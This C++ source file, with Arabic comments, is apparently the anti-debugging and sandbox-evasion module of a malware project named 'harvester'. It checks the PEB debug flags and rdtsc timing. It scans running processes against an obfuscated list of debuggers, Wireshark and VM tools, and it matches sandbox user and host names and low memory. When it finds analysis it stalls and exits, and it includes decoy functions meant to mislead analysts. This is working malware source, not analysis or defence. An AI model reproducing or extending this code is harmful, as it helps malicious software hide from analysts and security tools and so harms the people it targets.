// harvester/evasion/anti_debug.cpp – إصدار معتمد على GetObfuscatedString
#include "anti_debug.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <intrin.h>
#include <psapi.h>
#include <string>
#include <cstring>

#pragma comment(lib, "psapi.lib")

// تعريف PEB يدوياً (لأن MinGW قد لا يعرفه)
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    BYTE Reserved3[2];
    PVOID Reserved4[1];
    PVOID ImageBaseAddress;
    PVOID Reserved5[1];
} PEB, *PPEB;

static bool CheckPEBBeingDebugged() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && peb->BeingDebugged)
        return true;
    if (peb && (*(DWORD*)((BYTE*)peb + 0xBC) & 0x70) != 0)
        return true;
    return false;
}

static bool CheckTiming() {
    __int64 t1 = __rdtsc();
    __int64 t2 = __rdtsc();
    return (t2 - t1) > 10000;
}

static bool CheckSuspiciousProcesses() {
    DWORD pids[1024], bytesReturned;
    if (!EnumProcesses(pids, sizeof(pids), &bytesReturned))
        return false;
    DWORD numPids = bytesReturned / sizeof(DWORD);
    
    // قائمة أسماء العمليات المشبوهة (تُجلب مشفرة)
    int suspiciousIDs[] = {
        STR_VMTOOLSD, STR_PROCMON, STR_PROCEXP, STR_WIRESHARK,
        STR_X64DBG, STR_OLLYDBG, STR_IDA, STR_WINDBG, STR_VBOXSERVICE
    };
    
    for (DWORD i = 0; i < numPids; i++) {
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (h) {
            char name[MAX_PATH];
            if (GetModuleBaseNameA(h, NULL, name, sizeof(name))) {
                for (int sid : suspiciousIDs) {
                    std::string suspect = GetObfuscatedString(sid);
                    if (_stricmp(name, suspect.c_str()) == 0) {
                        CloseHandle(h);
                        return true;
                    }
                }
            }
            CloseHandle(h);
        }
    }
    return false;
}

static bool CheckSandboxNames() {
    char user[256];
    DWORD len = 256;
    GetUserNameA(user, &len);
    int sandboxUserIDs[] = {STR_SANDBOX, STR_MALWARE, STR_VIRUS, STR_TEST, STR_USER};
    for (int sid : sandboxUserIDs) {
        std::string bad = GetObfuscatedString(sid);
        if (strstr(user, bad.c_str())) return true;
    }
    
    char host[MAX_COMPUTERNAME_LENGTH + 1];
    len = sizeof(host);
    GetComputerNameA(host, &len);
    int sandboxHostIDs[] = {STR_SANDBOX, STR_MALWARE, STR_ANALYSIS, STR_VIRTUAL};
    for (int sid : sandboxHostIDs) {
        std::string bad = GetObfuscatedString(sid);
        if (strstr(host, bad.c_str())) return true;
    }
    return false;
}

static bool CheckLowMemory() {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    return mem.ullTotalPhys < 2ull * 1024 * 1024 * 1024;
}

bool IsDebuggerPresentAdvanced() {
    if (IsDebuggerPresent()) return true;
    if (CheckPEBBeingDebugged()) return true;
    if (CheckTiming()) return true;
    return false;
}

bool IsSandboxEnvironment() {
    if (CheckSuspiciousProcesses()) return true;
    if (CheckSandboxNames()) return true;
    if (CheckLowMemory()) return true;
    return false;
}

void AntiDebugLoop() {
    if (IsDebuggerPresentAdvanced() || IsSandboxEnvironment()) {
        Sleep(1800000);  // 30 دقيقة
        exit(0);
    }
}

// دوال وهمية للتضليل (لا تحتوي على نصوص حساسة)
void DummyAntiDebugFunction1() {
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x += i;
}

void DummyAntiDebugFunction2() {
    volatile char buf[512];
    for (int i = 0; i < 512; i++) buf[i] = (char)(i * 3);
}

void DummyAntiDebugFunction3() {
    volatile DWORD dummy = GetTickCount();
    dummy ^= 0xDEADBEEF;
}

void __attribute__((noinline)) SleepForever() {
    Sleep(0xFFFFFFFF);
}

void __attribute__((noinline)) CrashProcess() {
    int* p = nullptr;
    *p = 0;
}